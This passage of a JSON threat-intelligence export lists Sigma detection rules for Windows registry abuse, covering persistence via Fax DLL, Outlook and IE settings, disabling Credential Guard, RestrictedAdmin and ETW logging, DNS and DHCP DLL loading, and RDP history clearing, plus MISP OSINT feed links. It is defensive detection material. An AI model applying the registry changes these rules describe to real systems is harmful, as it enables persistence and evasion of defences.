                    "5d9b516c-e5f0-4e7c-a958-5d8c0a019371",
                    "761270e6-3a97-4c18-9a44-a844cb5b562b",
                    "bf4fc428-dcc3-4bbd-99fe-2422aeee2544",
                    "18beca67-ab3e-4ee3-ba7a-a46ca8d7d0cc",
                    "37b437cf-3fc5-4c8e-9c94-1d7c9aff842b",
                    "68fcba0d-73a5-475e-a915-e8b4c576827e",
                    "b0524451-19af-4efa-a46f-562a977f792e",
                    "21f17060-b282-4249-ade0-589ea3591558",
                    "d67572a0-e2ec-45d6-b8db-c100d14b8ef2",
                    "275641a5-a492-45e2-a817-7c81e9d9d3e9",
                    "7ec912f2-5175-4868-b811-ec13ad0f8567",
                    "73bba97f-a82d-42ce-b315-9182e76c57b1",
                    "a4c90ea1-2634-4ca0-adbb-35eae169b6fc",
                    "d6ce7ebd-260b-4323-9768-a9631c8d4db2",
                    "a2863fbc-d5cb-48d5-83fb-d976d4b1743b",
                    "171b67e1-74b4-460e-8d55-b331f3e32d67",
                    "5f60740a-f57b-4e76-82a1-15b6ff2cb134",
                    "5c6baef6-fca0-446e-b0b1-ac45950d210f",
                    "35c55673-84ca-4e99-8d09-e334f3c29539",
                    "0d5675be-bc88-4172-86d3-1e96a4476536",
                    "77946e79-97f1-45a2-84b4-f37b5c0d8682",
                    "4f281b83-0200-4b34-bf35-d24687ea57c2",
                    "3f6b7b62-61aa-45db-96bd-9c31b36b653c",
                    "53ba33fd-3a50-4468-a5ef-c583635cfa92",
                    "57340c81-c025-4189-8fa0-fc7ede51bae4",
                    "919f2ef0-be2d-4a7a-b635-eb2b41fde044",
                    "d3abac66-f11c-4ed0-8acb-50cc29c97eed",
                    "e61e8a88-59a9-451c-874e-70fcc9740d67"
                ],
                "lookup_results": [
                    {
                        "uuid": "9e3357ba-09d4-4fbd-a7c5-ad6386314513",
                        "lookup_data": {
                            "description": "Detect possible persistence using Fax DLL load when service restart",
                            "raw": "author: frack113\ndate: 2022/07/17\ndescription: Detect possible persistence using Fax DLL load when service restart\ndetection:\n  condition: selection and not filter\n  filter:\n    Details: '%systemroot%\\system32\\fxst30.dll'\n  selection:\n    TargetObject|contains|all:\n    - \\Software\\Microsoft\\Fax\\Device Providers\\\n    - \\ImageName\nfalsepositives:\n- Unknown\nid: 9e3357ba-09d4-4fbd-a7c5-ad6386314513\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/12/30\nreferences:\n- https://twitter.com/dottor_morte/status/1544652325570191361\n- https://raw.githubusercontent.com/RiccardoAncarani/talks/master/F-Secure/unorthodox-lateral-movement.pdf\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Change the Fax Dll\n",
                            "sigma:id": "9e3357ba-09d4-4fbd-a7c5-ad6386314513",
                            "title": "Change the Fax Dll",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "487bb375-12ef-41f6-baae-c6a1572b4dd1",
                        "lookup_data": {
                            "description": "Detects the manipulation of persistent URLs which could execute malicious code",
                            "raw": "author: Tobias Michalski (Nextron Systems)\ndate: 2021/06/10\ndescription: Detects the manipulation of persistent URLs which could execute malicious\n  code\ndetection:\n  condition: selection1 and (selectionStamp or selectionUserDefined) and not 1 of\n    filter_*\n  filter_office:\n    Image|endswith: \\OfficeClickToRun.exe\n    Image|startswith:\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\\n  selection1:\n    EventType: SetValue\n    TargetObject|contains|all:\n    - Software\\Microsoft\\Office\\\n    - \\Outlook\\Today\\\n  selectionStamp:\n    Details: DWORD (0x00000001)\n    TargetObject|endswith: Stamp\n  selectionUserDefined:\n    TargetObject|endswith: UserDefinedUrl\nfalsepositives:\n- Unknown\nfields:\n- Details\nid: 487bb375-12ef-41f6-baae-c6a1572b4dd1\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/11/26\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=70\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1112\ntitle: Persistent Outlook Landing Today Pages\n",
                            "sigma:id": "487bb375-12ef-41f6-baae-c6a1572b4dd1",
                            "title": "Persistent Outlook Landing Today Pages",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "90f342e1-1aaa-4e43-b092-39fda57ed11e",
                        "lookup_data": {
                            "description": "Detects changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/12/09\ndescription: Detects changes to the \"ExtErrorInformation\" key in order to disable\n  ETW logging for rpcrt4.dll\ndetection:\n  condition: selection\n  selection:\n    Details:\n    - DWORD (0x00000000)\n    - DWORD (0x00000002)\n    EventType: SetValue\n    TargetObject|endswith: \\Microsoft\\Windows NT\\Rpc\\ExtErrorInformation\nfalsepositives:\n- Unknown\nid: 90f342e1-1aaa-4e43-b092-39fda57ed11e\nlevel: low\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- http://redplait.blogspot.com/2020/07/whats-wrong-with-etw.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\n- attack.t1562\ntitle: ETW Logging Disabled For rpcrt4.dll\n",
                            "sigma:id": "90f342e1-1aaa-4e43-b092-39fda57ed11e",
                            "title": "ETW Logging Disabled For rpcrt4.dll",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d88d0ab2-e696-4d40-a2ed-9790064e66b3",
                        "lookup_data": {
                            "description": "Detects modification of the registry settings used for Internet Explorer and other Windows components that use these settings. An attacker can abuse this registry key to add a domain to the trusted sites Zone or insert javascript for persistence",
                            "raw": "author: frack113\ndate: 2022/01/22\ndescription: Detects modification of the registry settings used for Internet Explorer\n  and other Windows components that use these settings. An attacker can abuse this\n  registry key to add a domain to the trusted sites Zone or insert javascript for\n  persistence\ndetection:\n  condition: selection_domains and not 1 of filter_*\n  filter_accepted_documents:\n    TargetObject|contains: \\Accepted Documents\\\n  filter_binary:\n    Details: Binary Data\n  filter_dword:\n    Details|startswith: DWORD\n  filter_office:\n    Details:\n    - 'Cookie:'\n    - 'Visited:'\n    - (Empty)\n  filter_path:\n    TargetObject|contains:\n    - \\Cache\n    - \\ZoneMap\n    - \\WpadDecision\n  selection_domains:\n    EventType: SetValue\n    TargetObject|contains: \\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\nfalsepositives:\n- Unknown\nid: d88d0ab2-e696-4d40-a2ed-9790064e66b3\nlevel: low\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2023/01/06\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-4---add-domain-to-trusted-sites-zone\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-5---javascript-in-registry\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Modification of IE Registry Settings\n",
                            "sigma:id": "d88d0ab2-e696-4d40-a2ed-9790064e66b3",
                            "title": "Modification of IE Registry Settings",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5d64d069-0fa0-45a4-bd65-b6f0950d210f",
                        "lookup_data": {
                            "description": "OSINT - Gamaredon group",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5d64d069-0fa0-45a4-bd65-b6f0950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1566995352",
                            "uuid": "5d64d069-0fa0-45a4-bd65-b6f0950d210f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4ac5fc44-a601-4c06-955b-309df8c4e9d4",
                        "lookup_data": {
                            "description": "Detects registry keys created in OceanLotus (also known as APT32) attacks",
                            "raw": "author: megan201296, Jonhnathan Ribeiro\ndate: 2019/04/14\ndescription: Detects registry keys created in OceanLotus (also known as APT32) attacks\ndetection:\n  condition: 1 of selection*\n  selection_hkcu:\n    TargetObject|contains:\n    - Classes\\AppXc52346ec40fb4061ad96be0e6cb7d16a\\\n    - Classes\\AppX3bbba44c6cae4d9695755183472171e2\\\n    - Classes\\CLSID\\{E3517E26-8E93-458D-A6DF-8030BC80528B}\\\n    - Classes\\CLSID\\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\\Model\n    TargetObject|startswith: HKCU\\\n  selection_ioc1:\n    TargetObject: HKCU\\SOFTWARE\\Classes\\CLSID\\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\\Model\n  selection_ioc2:\n    TargetObject|contains:\n    - AppXbf13d4ea2945444d8b13e2121cb6b663\\\n    - AppX70162486c7554f7f80f481985d67586d\\\n    - AppX37cc7fdccd644b4f85f4b22d5a3f105a\\\n    TargetObject|endswith:\n    - Application\n    - DefaultIcon\n    TargetObject|startswith:\n    - HKCU\\SOFTWARE\\App\\\n    - HKLM\\SOFTWARE\\App\\\nfalsepositives:\n- Unknown\nid: 4ac5fc44-a601-4c06-955b-309df8c4e9d4\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.welivesecurity.com/2019/03/20/fake-or-fake-keeping-up-with-oceanlotus-decoys/\n- https://github.com/eset/malware-ioc/tree/master/oceanlotus\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: OceanLotus Registry Activity\n",
                            "sigma:id": "4ac5fc44-a601-4c06-955b-309df8c4e9d4",
                            "title": "OceanLotus Registry Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c74d7efc-8826-45d9-b8bb-f04fac9e4eff",
                        "lookup_data": {
                            "description": "Rule to detect the configuration of Run Once registry key. Configured payload can be run by runonce.exe /AlternateShellStartup",
                            "raw": "author: Avneet Singh @v3t0_, oscd.community\ndate: 2020/11/15\ndescription: Rule to detect the configuration of Run Once registry key. Configured\n  payload can be run by runonce.exe /AlternateShellStartup\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_chrome:\n    Details|contains: \\Installer\\chrmstp.exe\" --configure-user-settings --verbose-logging\n      --system-level\n    Details|startswith: '\"C:\\Program Files\\Google\\Chrome\\Application\\'\n  filter_edge:\n    Details|endswith: \\Installer\\setup.exe\" --configure-user-settings --verbose-logging\n      --system-level --msedge --channel=stable\n    Details|startswith:\n    - '\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\'\n    - '\"C:\\Program Files\\Microsoft\\Edge\\Application\\'\n  selection:\n    TargetObject|endswith: \\StubPath\n    TargetObject|startswith: HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\nfalsepositives:\n- Legitimate modification of the registry key by legitimate program\nid: c74d7efc-8826-45d9-b8bb-f04fac9e4eff\nlevel: medium\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/04/04\nreferences:\n- https://twitter.com/pabraeken/status/990717080805789697\n- https://lolbas-project.github.io/lolbas/Binaries/Runonce/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Run Once Task Configuration in Registry\n",
                            "sigma:id": "c74d7efc-8826-45d9-b8bb-f04fac9e4eff",
                            "title": "Run Once Task Configuration in Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
                        "lookup_data": {
                            "description": "Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server (restart required)",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/05/08\ndescription: Detects the installation of a plugin DLL via ServerLevelPluginDll parameter\n  in Registry, which can be used to execute code in context of the DNS server (restart\n  required)\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - /config\n    - /serverlevelplugindll\n    Image|endswith: \\dnscmd.exe\nfalsepositives:\n- Unknown\nfields:\n- EventID\n- CommandLine\n- ParentCommandLine\n- Image\n- User\n- TargetObject\nid: f63b56ee-3f79-4b8a-97fb-5c48007e8573\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\nrelated:\n- id: e61e8a88-59a9-451c-874e-70fcc9740d67\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1574.002\n- attack.t1112\ntitle: DNS ServerLevelPluginDll Install\n",
                            "sigma:id": "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
                            "title": "DNS ServerLevelPluginDll Install",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "96f697b0-b499-4e5d-9908-a67bec11cdb6",
                        "lookup_data": {
                            "description": "A General detection to trigger for processes removing .*\\shell\\open\\command registry keys. Registry keys that might have been used for COM hijacking activities.",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/05/02\ndescription: A General detection to trigger for processes removing .*\\shell\\open\\command\n  registry keys. Registry keys that might have been used for COM hijacking activities.\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_dropbox:\n    Image|endswith: \\Dropbox.exe\n    TargetObject|contains: \\Dropbox.\n  filter_everything:\n    Image|endswith: \\Everything.exe\n    TargetObject|contains: \\Everything.\n  filter_integrator:\n    Image: C:\\Program Files (x86)\\Microsoft Office\\root\\integration\\integrator.exe\n  filter_java:\n    Image|endswith: \\installer.exe\n    Image|startswith: C:\\Program Files (x86)\\Java\\\n    TargetObject|contains: \\Classes\\WOW6432Node\\CLSID\\{4299124F-F2C3-41b4-9C73-9236B2AD0E8F}\n  filter_office:\n    Image|endswith: \\OfficeClickToRun.exe\n    Image|startswith:\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\\n  filter_opera:\n    Image|endswith: \\installer.exe\n    Image|startswith:\n    - C:\\Program Files\\Opera\\\n    - C:\\Program Files (x86)\\Opera\\\n  filter_peazip:\n    Image|contains: peazip\n    TargetObject|contains: \\PeaZip.\n  filter_svchost:\n    Image: C:\\Windows\\system32\\svchost.exe\n  filter_uninstallers:\n    Image|startswith: C:\\Windows\\Installer\\MSI\n  filter_wireshark:\n    Image|endswith: \\AppData\\Local\\Temp\\Wireshark_uninstaller.exe\n    TargetObject|contains: \\wireshark-capture-file\\\n  selection:\n    EventType: DeleteKey\n    TargetObject|endswith: \\shell\\open\\command\nfalsepositives:\n- Legitimate software (un)installations are known to cause some false positives. Please\n  add them as a filter when encountered\nid: 96f697b0-b499-4e5d-9908-a67bec11cdb6\nlevel: medium\nlogsource:\n  category: registry_delete\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://github.com/OTRF/detection-hackathon-apt29/issues/7\n- https://threathunterplaybook.com/evals/apt29/detections/3.C.1_22A46621-7A92-48C1-81BF-B3937EB4FDC3.html\n- https://docs.microsoft.com/en-us/windows/win32/shell/launch\n- https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iexecutecommand\n- https://docs.microsoft.com/en-us/windows/win32/shell/shell-and-managed-code\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Removal of Potential COM Hijacking Registry Keys\n",
                            "sigma:id": "96f697b0-b499-4e5d-9908-a67bec11cdb6",
                            "title": "Removal of Potential COM Hijacking Registry Keys",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "83314318-052a-4c90-a1ad-660ece38d276",
                        "lookup_data": {
                            "description": "BlackByte set three different registry values to escalate privileges and begin setting the stage for lateral movement and encryption",
                            "raw": "author: frack113\ndate: 2022/01/24\ndescription: BlackByte set three different registry values to escalate privileges\n  and begin setting the stage for lateral movement and encryption\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject:\n    - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy\n    - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLinkedConnections\n    - HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\LongPathsEnabled\nfalsepositives:\n- Unknown\nid: 83314318-052a-4c90-a1ad-660ece38d276\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://redcanary.com/blog/blackbyte-ransomware/?utm_source=twitter&utm_medium=social\n- https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Blackbyte Ransomware Registry\n",
                            "sigma:id": "83314318-052a-4c90-a1ad-660ece38d276",
                            "title": "Blackbyte Ransomware Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1a2d6c47-75b0-45bd-b133-2c0be75349fd",
                        "lookup_data": {
                            "description": "Detects potential malicious modification of the property value of IsCredGuardEnabled from\nHKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest to disable Cred Guard on a system.\nThis is usually used with UseLogonCredential to manipulate the caching credentials.\n",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2019/08/25\ndescription: 'Detects potential malicious modification of the property value of IsCredGuardEnabled\n  from\n\n  HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest to disable Cred\n  Guard on a system.\n\n  This is usually used with UseLogonCredential to manipulate the caching credentials.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    TargetObject|endswith: \\IsCredGuardEnabled\nfalsepositives:\n- Unknown\nid: 1a2d6c47-75b0-45bd-b133-2c0be75349fd\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://teamhydra.blog/2020/08/25/bypassing-credential-guard/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Wdigest CredGuard Registry Modification\n",
                            "sigma:id": "1a2d6c47-75b0-45bd-b133-2c0be75349fd",
                            "title": "Wdigest CredGuard Registry Modification",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5dee2bc3-47ac-4784-a52a-4da2950d210f",
                        "lookup_data": {
                            "description": "OSINT - BfV Cyber-Brief Nr. 01/2019 - Hinweis auf aktuelle Angriffskampagne -",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5dee2bc3-47ac-4784-a52a-4da2950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1576068623",
                            "uuid": "5dee2bc3-47ac-4784-a52a-4da2950d210f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ce6e34ca-966d-41c9-8d93-5b06c8b97a06",
                        "lookup_data": {
                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: 1 of selection*\n  selection_process0:\n    CommandLine|contains: \\Service.exe\n    CommandLine|endswith:\n    - i\n    - u\n  selection_process1:\n  - CommandLine|endswith: \\microsoft\\Taskbar\\autoit3.exe\n  - CommandLine|startswith: C:\\wsc.exe\n  selection_process2:\n    Image|contains: \\Windows\\Temp\\DB\\\n    Image|endswith: .exe\n  selection_process3:\n    CommandLine|contains|all:\n    - \\nslookup.exe\n    - -q=TXT\n    ParentImage|contains: \\Autoit\nfalsepositives:\n- Unknown\nid: ce6e34ca-966d-41c9-8d93-5b06c8b97a06\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/09/19\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nrelated:\n- id: 53ba33fd-3a50-4468-a5ef-c583635cfa92\n  type: derived\nstatus: test\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity\n",
                            "sigma:id": "ce6e34ca-966d-41c9-8d93-5b06c8b97a06",
                            "title": "Chafer Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
                        "lookup_data": {
                            "description": "UEFI threats moving to the ESP: Introducing ESPecter bootkit",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5df8df26-fe0e-4858-94a7-6cf71d9519c9.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1637336858",
                            "uuid": "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "07bdd2f5-9c58-4f38-aec8-e101bb79ef8d",
                        "lookup_data": {
                            "description": "Detects the deletion of registry keys containing the MSTSC connection history",
                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/10/19\ndescription: Detects the deletion of registry keys containing the MSTSC connection\n  history\ndetection:\n  condition: 1 of selection*\n  selection1:\n    EventType: DeleteValue\n    TargetObject|contains: \\Microsoft\\Terminal Server Client\\Default\\MRU\n  selection2:\n    EventType: DeleteKey\n    TargetObject|contains: \\Microsoft\\Terminal Server Client\\Servers\\\nfalsepositives:\n- Unknown\nid: 07bdd2f5-9c58-4f38-aec8-e101bb79ef8d\nlevel: high\nlogsource:\n  category: registry_delete\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer\n- http://woshub.com/how-to-clear-rdp-connections-history/\n- https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1070\n- attack.t1112\ntitle: Terminal Server Client Connection History Cleared\n",
                            "sigma:id": "07bdd2f5-9c58-4f38-aec8-e101bb79ef8d",
                            "title": "Terminal Server Client Connection History Cleared",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "04b45a8a-d11d-49e4-9acc-4a1b524407a5",
                        "lookup_data": {
                            "description": "Detects when a user enables DNS-over-HTTPS.\nThis can be used to hide internet activity or be used to hide the process of exfiltrating data.\nWith this enabled organization will lose visibility into data such as query type, response and originating IP that are used to determine bad actors.\n",
                            "raw": "author: Austin Songer\ndate: 2021/07/22\ndescription: 'Detects when a user enables DNS-over-HTTPS.\n\n  This can be used to hide internet activity or be used to hide the process of exfiltrating\n  data.\n\n  With this enabled organization will lose visibility into data such as query type,\n  response and originating IP that are used to determine bad actors.\n\n  '\ndetection:\n  condition: 1 of selection_*\n  selection_chrome:\n    Details: secure\n    EventType: SetValue\n    TargetObject|endswith: \\SOFTWARE\\Google\\Chrome\\DnsOverHttpsMode\n  selection_edge:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith: \\SOFTWARE\\Policies\\Microsoft\\Edge\\BuiltInDnsClientEnabled\n  selection_firefox:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|endswith: \\SOFTWARE\\Policies\\Mozilla\\Firefox\\DNSOverHTTPS\\Enabled\nfalsepositives:\n- Unlikely\nid: 04b45a8a-d11d-49e4-9acc-4a1b524407a5\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://www.tenforums.com/tutorials/151318-how-enable-disable-dns-over-https-doh-microsoft-edge.html\n- https://github.com/elastic/detection-rules/issues/1371\n- https://chromeenterprise.google/policies/?policy=DnsOverHttpsMode\n- https://admx.help/HKLM/Software/Policies/Mozilla/Firefox/DNSOverHTTPS\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1140\n- attack.t1112\ntitle: DNS-over-HTTPS Enabled by Registry\n",
                            "sigma:id": "04b45a8a-d11d-49e4-9acc-4a1b524407a5",
                            "title": "DNS-over-HTTPS Enabled by Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9d3436ef-9476-4c43-acca-90ce06bdf33a",
                        "lookup_data": {
                            "description": "Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled parameter in Registry, which can be used to execute code in context of the DHCP server (restart required)",
                            "raw": "author: Dimitrios Slamaris\ndate: 2017/05/15\ndescription: Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled\n  parameter in Registry, which can be used to execute code in context of the DHCP\n  server (restart required)\ndetection:\n  condition: selection\n  selection:\n    EventType: Setvalue\n    TargetObject|endswith:\n    - \\Services\\DHCPServer\\Parameters\\CalloutDlls\n    - \\Services\\DHCPServer\\Parameters\\CalloutEnabled\nfalsepositives:\n- Unknown\nid: 9d3436ef-9476-4c43-acca-90ce06bdf33a\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/06/26\nreferences:\n- https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html\n- https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx\n- https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1574.002\n- attack.t1112\ntitle: DHCP Callout DLL Installation\n",
                            "sigma:id": "9d3436ef-9476-4c43-acca-90ce06bdf33a",
                            "title": "DHCP Callout DLL Installation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ddd171b5-2cc6-4975-9e78-f0eccd08cc76",
                        "lookup_data": {
                            "description": "Detects the manipulation of persistent URLs which can be malicious",
                            "raw": "author: Tobias Michalski (Nextron Systems)\ndate: 2021/06/09\ndescription: Detects the manipulation of persistent URLs which can be malicious\ndetection:\n  condition: all of selection_*\n  selection_1:\n    EventType: SetValue\n    TargetObject|contains:\n    - \\Software\\Microsoft\\Office\\\n    - \\Outlook\\WebView\\\n    TargetObject|endswith: \\URL\n  selection_2:\n    TargetObject|contains:\n    - \\Calendar\\\n    - \\Inbox\\\nfalsepositives:\n- Unknown\nfields:\n- Details\nid: ddd171b5-2cc6-4975-9e78-f0eccd08cc76\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/06/26\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=70\n- https://support.microsoft.com/en-us/topic/outlook-home-page-feature-is-missing-in-folder-properties-d207edb7-aa02-46c5-b608-5d9dbed9bd04?ui=en-us&rs=en-us&ad=us\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1112\ntitle: Persistent Outlook Landing Pages\n",
                            "sigma:id": "ddd171b5-2cc6-4975-9e78-f0eccd08cc76",
                            "title": "Persistent Outlook Landing Pages",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "28ac00d6-22d9-4a3c-927f-bbd770104573",
                        "lookup_data": {
                            "description": "Detect activation of DisableRestrictedAdmin to desable RestrictedAdmin mode.\nRestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\nThis prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\n",
                            "raw": "author: frack113\ndate: 2023/01/13\ndescription: 'Detect activation of DisableRestrictedAdmin to desable RestrictedAdmin\n  mode.\n\n  RestrictedAdmin mode prevents the transmission of reusable credentials to the remote\n  system to which you connect using Remote Desktop.\n\n  This prevents your credentials from being harvested during the initial connection\n  process if the remote server has been compromise\n\n  '\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - \\System\\CurrentControlSet\\Control\\Lsa\\\n    - DisableRestrictedAdmin\n    - ' 1'\nfalsepositives:\n- Unknown\nid: 28ac00d6-22d9-4a3c-927f-bbd770104573\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md\n- https://social.technet.microsoft.com/wiki/contents/articles/32905.remote-desktop-services-enable-restricted-admin-mode.aspx\nrelated:\n- id: d6ce7ebd-260b-4323-9768-a9631c8d4db2\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\ntitle: Disabled RestrictedAdminMode For RDS - ProcCreation\n",
                            "sigma:id": "28ac00d6-22d9-4a3c-927f-bbd770104573",
                            "title": "Disabled RestrictedAdminMode For RDS - ProcCreation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
                        "lookup_data": {
                            "description": "SectorJ04 Groupâ€™s Increased Activity in 2019",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5d6e7aa3-aca4-46cc-b96a-46ac950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1568039252",
                            "uuid": "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c0580559-a6bd-4ef6-b9b7-83703d98b561",
                        "lookup_data": {
                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
